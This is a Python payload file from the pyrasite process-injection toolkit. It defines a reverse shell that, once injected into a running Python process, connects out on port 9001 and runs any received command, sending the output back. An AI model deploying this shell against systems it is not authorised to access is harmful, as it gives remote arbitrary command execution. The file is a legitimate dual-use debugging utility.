# This file is part of pyrasite.
#
# pyrasite is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# pyrasite is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with pyrasite.  If not, see <http://www.gnu.org/licenses/>.
#
# Copyright (C) 2011, 2012 Red Hat, Inc., Luke Macken <lmacken@redhat.com>

import pyrasite

class ReverseShell(pyrasite.ReverseConnection):

    reliable = False # This payload is designed to be used with netcat
    port = 9001

    def on_connect(self):
        uname = pyrasite.utils.run('uname -a')[1]
        self.send("%sType 'quit' to exit\n%% " % uname)

    def on_command(self, cmd):
        p, out, err = pyrasite.utils.run(cmd)
        if err:
            out += err
        self.send(out + '\n% ')
        return True

ReverseShell().start()
